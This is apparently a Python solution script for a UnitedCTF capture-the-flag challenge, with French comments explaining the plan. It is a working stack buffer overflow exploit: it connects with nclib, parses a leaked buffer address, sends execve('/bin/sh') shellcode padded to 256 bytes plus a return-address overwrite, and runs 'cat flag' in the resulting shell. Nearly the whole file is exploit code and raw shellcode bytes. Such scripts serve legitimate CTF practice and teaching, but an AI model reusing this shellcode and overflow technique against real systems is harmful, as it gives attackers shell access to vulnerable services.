from nclib import netcat

def fill_buffer(length, to_prepend=b''):
	return to_prepend + b'A'*(length - len(to_prepend))

# echo -e -n '1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

# buffer_size = 256
# Le programme print l'adresse mémoire de notre buffer au début
# Le plan est de mettre notre shellcode au début du buffer
# et d'overflow pour que le ret address pointe vers le début du buffer

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

nc = netcat.Netcat(('challenges.unitedctf.ca', 17002))

payload = fill_buffer(256, shellcode)
rbp_overwrite = b'A' * 8
address = bytes.fromhex(nc.recv().decode().split(' ')[-1][2:-1])[::-1]

nc.send(payload + rbp_overwrite + address + b'\n')
nc.send('cat flag\n')
print(nc.recv().decode())